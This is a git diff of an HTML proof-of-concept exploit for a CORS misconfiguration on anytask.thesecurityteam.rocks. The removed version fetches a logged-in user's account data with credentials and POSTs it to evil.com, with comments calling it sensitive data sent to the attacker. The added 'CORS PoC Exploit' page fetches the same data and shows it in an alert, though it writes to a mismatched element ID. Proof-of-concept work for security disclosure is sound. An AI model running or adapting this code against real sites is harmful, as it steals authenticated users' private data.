@@ -1,24 +1,27 @@
+<!DOCTYPE html>
 <html>
-<body>
-<button type='button' onclick='cors()'>CORS</button>
-<p id='demo'></p>
-<script>
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-var a = this.responseText; // Sensitive data from niche.co about user account
-document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "http://evil.com/anytask.thesecurityteam.rocks.bing.com", true);// Sending that data to Attacker's website
-xhttp.withCredentials = true;
-console.log(a);
-xhttp.send("data="+a);
-}
-};
-xhttp.open("GET", "https://anytask.thesecurityteam.rocks/user", true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
-</script>
-</body>
+   <head>
+      <script>
+         function cors() {
+	        var xhttp = new XMLHttpRequest();
+		        xhttp.onreadystatechange = function() {
+			        if (this.readyState == 4 && this.status == 200) {
+			        	document.getElementById("emo").innerHTML = alert(this.responseText);
+	        }
+         };
+         xhttp.open("GET", "https://www.api.anytask.thesecurityteam.rocks/user", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://www.linkedin.com/in/prathmesh-akotkar-952884192/">@Prathmesh</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
 </html>
